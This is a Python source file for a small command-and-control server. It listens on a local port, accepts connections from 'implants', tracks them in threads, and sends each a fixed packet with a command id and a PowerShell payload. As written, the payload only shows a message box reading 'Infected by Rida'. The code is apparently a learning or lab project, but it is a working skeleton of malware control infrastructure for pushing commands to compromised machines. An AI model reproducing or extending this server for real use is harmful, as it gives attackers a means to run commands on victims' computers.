import struct, socket
import threading, random

#Default MessageBox as PWSH padded on 1024 bytes
defaultCmdData = b"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')".ljust(1024, b"\x00")

class C2:
    def __init__(self):
        self.host = "127.0.0.1"
        self.port = 8888

        self.activeimplant = []
        self.implantcount = 0
        self.maximplant = 50
        self.lock = threading.Lock()
    
    def remove_implant(self, implant):
        with self.lock:
            if implant in self.activeimplant:
                self.activeimplant.remove(implant)
                print(f"[C2 - Server] Implant {implant.implant_id} removed (active={len(self.activeimplant)})")
                self.implantcount -= 1
            else:
                print(f"[C2 - Server][WARN] Implant {implant.implant_id} not found in active list")
    
    def startC2(self):
        print("[C2 - Server] C2 server succesfully started")
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.bind((self.host, self.port))
        self.server_sock.listen(self.maximplant)
        print(f"[C2 - Server] C2 server listening on {self.host}:{self.port}")
        try :
            while 1:
                implant_sock, addr = self.server_sock.accept()
                print("[C2 - Server] New implant reached the C2 !")
                implant_id = self.implantcount
                print(f"[C2 - Server] Implant id : {implant_id} | Implant IP {addr}")
                self.activeimplant.append(Implant(implant_id, implant_sock, self))
                self.implantcount += 1
        except KeyboardInterrupt : 
            self.server_sock.close()


class Implant(threading.Thread):
    def __init__(self, implant_id: int, implant_sock: socket, context: C2):
        threading.Thread.__init__(self)
        self.implant_id = implant_id
        self.implant_sock = implant_sock
        self.context = context
        self.active = 1

        self.start()
    
    def run(self):
        try:
            self.SendImplant(1, defaultCmdData)
        finally:
            self.implant_sock.close()
            self.context.remove_implant(self)


    def SendImplant(self, cmdId:int, Data:bytes):
        c2_pkt = struct.pack("<I1024s", cmdId, Data)

        print(f"[C2 - Server] Sending Implant {self.implant_id} CmdId : {cmdId}")
        self.implant_sock.sendall(c2_pkt)

if __name__ == "__main__":
    rzdhopC2 = C2()

    rzdhopC2.startC2()



